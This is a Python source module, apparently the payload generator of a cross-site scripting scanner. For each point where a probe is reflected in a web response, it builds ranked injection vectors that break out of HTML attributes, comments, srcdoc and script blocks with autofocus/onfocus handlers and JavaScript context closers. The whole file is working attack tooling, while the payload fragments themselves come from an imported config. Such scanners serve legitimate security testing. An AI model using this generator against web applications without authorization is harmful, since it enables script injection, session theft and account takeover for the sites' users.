from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts


def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}
    for i in occurences:
        context = occurences[i]['context'][0]
        breaker = occurences[i]['context'][1]
        special = occurences[i]['context'][2]
        try:
            attributeName = list(occurences[i]['context'][3].keys())[0]
            attributeValue = list(occurences[i]['context'][3].values())[0]
        except AttributeError:
            attributeName = occurences[i]['context'][3]
        if special not in badTags:
            special = ''
        elif context == 'attribute':
            special = '</' + special + '/>'
        else:
            special = ''
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            if breaker == '\'' or breaker == '"':
                breaker = ''
                breakerEfficiency = 100
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'attribute':
            found = False
            breakerEfficiency = occurences[i]['score'][breaker]
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if greatBracketEfficiency == 100 and breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    if breaker:
                        payload = payload.replace(breaker, breaker + '>')
                    else:
                        payload = '>' + payload
                    found = True
                    vectors[6].add(payload)
            if breakerEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = breaker + filling + 'auTOfOcuS' + \
                            filling + 'OnFoCUs' + '=' + breaker + function
                        found = True
                        vectors[6].add(vector)
            if breakerEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + breaker + filling + 'auTOfOcuS' + filling + \
                            'OnFoCUs' + '=' + function + filling + '\\' + breaker
                        found = True
                        vectors[6].add(vector)
            if attributeName == 'srcdoc':
                if occurences[i]['score']['&lt;']:
                    if occurences[i]['score']['&gt;']:
                        del ends[:]
                        ends.append('%26gt;')
                    payloads = genGen(
                        fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, '', '')
                    for payload in payloads:
                        found = True
                        vectors[9].add(payload.replace('<', '%26lt;'))
            if attributeName.startswith('on'):
                closer = jsContexter(attributeValue)
                breaker = ''
                for char in attributeValue.split(xsschecker)[1]:
                    if char in ['\'', '"', '`']:
                        breaker = char
                        break
                if closer:
                    suffix = '//\\'
                    for filling in jFillings:
                        for function in functions:
                            vector = breaker + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)
                elif breakerEfficiency > 83:
                    suffix = '//'
                    for filling in jFillings:
                        for function in functions:
                            if '=' in function:
                                function = '(' + function + ')'
                            if breaker == '':
                                filling = ''
                            vector = '\\' + breaker + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)

        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == breakerEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = jsContexter(script)
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = occurences[i]['score'][breaker]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, breaker, special)
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = '//\\'
                if not breaker:
                    closer = closer[1:]
                if breakerEfficiency != 100:
                    breaker = ''
                for filling in jFillings:
                    for function in functions:
                        vector = breaker + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency > 83:
                suffix = '//'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if breaker == '':
                            filling = ''
                        vector = '\\' + breaker + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors
